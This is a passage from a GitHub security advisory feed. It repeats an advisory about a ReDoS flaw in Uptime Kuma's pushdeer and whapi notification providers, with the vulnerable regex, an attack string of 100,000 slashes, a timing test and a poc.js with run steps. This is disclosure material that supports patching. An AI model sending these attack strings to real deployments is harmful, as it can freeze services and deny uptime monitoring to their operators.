<p>After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.
<img src="https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812" alt="redos" width="760"></p>
<p>You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of <code>/</code> to the URL, followed by a <code>non-/</code> character at the end, entered directly.</p>
<img src="https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408" alt="1" width="1280">
<img src="https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669" alt="webserver" width="1280">

<h3 id="impact">Impact</h3>
<p><strong>What kind of vulnerability is it?</strong></p>
<p>This is a <code>Regular Expression Denial of Service (ReDoS)</code> vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in <code>significant performance degradation or complete service unavailability</code>, especially when processing specially crafted attack strings.</p>
<p><strong>Who is impacted?</strong></p>
<ol>
<li><p><strong>Uptime Kuma users</strong>:
Any users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like <code>pushdeer.js</code> and <code>whapi.js</code>. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.</p>
</li>
<li><p><strong>Web services and hosting providers</strong>:
If Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to <code>downtime</code>, <code>degraded performance</code>, or <code>resource exhaustion</code>.</p>
</li>
</ol>
<h3 id="solution">Solution</h3>
<p>@louislam I have provided a solution for you to check:<a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></li>
<li><a href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T16:12:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking]]></title>
        <id>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</id>
        <link href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg"/>
        <updated>2025-03-31T16:12:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a <code>ReDoS vulnerability risk</code> in the system, specifically when administrators create <code>notification</code> through the web service(<code>pushdeer</code> and <code>whapi</code>). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.</p>
<h3 id="details">Details</h3>
<p>The regular expression<code> \/*$\</code> is used to match zero or more slashes <code>/</code> at the end of a URL. When a malicious attack string appends a large number of slashes <code>/</code> and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.</p>
<pre><code class="language-js">.replace(/\/*$/, "")
</code></pre>
<p>For the regular expression <code>/\/*$/</code>, an attack string like </p>
<pre><code class="language-javascript">"https://e" + "/".repeat(100000) + "@" 
</code></pre>
<p>can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.</p>
<blockquote>
<p>When entered from the web interface, the attack string needs to expand <code>"/".repeat(100000)</code> and be input directly, such as <code>https://e/////////..//@</code>. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>The poc.js is in: 
<a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a>
The time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:</p>
<pre><code class="language-javascript">const semver = require("semver");
let test;
const nodeVersion = process.versions.node;
if (semver.satisfies(nodeVersion, "&gt;= 18")) {
    test = require("node:test");
} else {
    test = require("test");
}
const PushDeer = require("../../server/notification-providers/pushdeer.js");

const assert = require("node:assert");

test("Test ReDos - attack string", async (t) =&gt; {
    const pushDeer = new PushDeer();
    const notification = {
        pushdeerServer: "https://e" + "/".repeat(100000) + "@",
    };
    const msg = "Test Attacking";
    const startTime = performance.now();
    try {
        pushDeer.send(notification, msg)
    } catch (error) {
    // pass
    }
    const endTime = performance.now();
    const elapsedTime = endTime - startTime;
    const reDosThreshold = 2000;
    assert(elapsedTime &lt;= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);
});
</code></pre>
<blockquote>
<p>Move the <code>test-uptime-calculator.js</code> file to the <code>./uptime-kuma/test/backend-test</code> folder and run <code>npm run test-backend</code> to execute the backend tests.</p>
</blockquote>
<p>Trigger conditions for whapi jams, In the send function within the <code>uptime-kuma\server\notification-providers\pushdeer.js</code> file:
<a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></p>
<pre><code class="language-js">// The attack string "httpS://example" + "/".repeat(100000) + "@"
// poc.js
// Import the target file
const Whapi = require("./uptime-kuma/server/notification-providers/whapi");

// Create an instance of Whapi
const whapi = new Whapi();

const notification = {
    whapiApiUrl: "https://e" + "/".repeat(100000) + "@",
};
// console.log(`${notification.whapiApiUrl}`);
// Define the message to be sent
const msg = "Test Attacking";

// Call the send method and handle exceptions
whapi.send(notification, msg)

// 1-5 are the original installation methods for the project
// 6-8 are attack methods
// ---
// 1.run `git clone https://github.com/louislam/uptime-kuma.git`
// 2.run `cd uptime-kuma`
// 3.run `npm run setup`
// 4.run `npm install pm2 -g &amp;&amp; pm2 install pm2-logrotate`
// 5.run `pm2 start server/server.js --name uptime-kuma`
// ---
// 6.Run npm install in the root directory of the same level as `README.md`
// 7.Move `poc.js` to the root directory of the same level as `README.md`
// 8.and then run `node poc.js`
</code></pre>
<p>After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.
<img src="https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812" alt="redos" width="760"></p>
<p>You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of <code>/</code> to the URL, followed by a <code>non-/</code> character at the end, entered directly.</p>
<img src="https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408" alt="1" width="1280">
<img src="https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669" alt="webserver" width="1280">

<h3 id="impact">Impact</h3>
<p><strong>What kind of vulnerability is it?</strong></p>
<p>This is a <code>Regular Expression Denial of Service (ReDoS)</code> vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in <code>significant performance degradation or complete service unavailability</code>, especially when processing specially crafted attack strings.</p>
<p><strong>Who is impacted?</strong></p>
<ol>
<li><p><strong>Uptime Kuma users</strong>:
Any users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like <code>pushdeer.js</code> and <code>whapi.js</code>. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.</p>
</li>
<li><p><strong>Web services and hosting providers</strong>:
If Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to <code>downtime</code>, <code>degraded performance</code>, or <code>resource exhaustion</code>.</p>
</li>
</ol>
<h3 id="solution">Solution</h3>
<p>@louislam I have provided a solution for you to check:<a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></li>
<li><a href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T16:12:53.000Z</published>
    </entry>
</feed>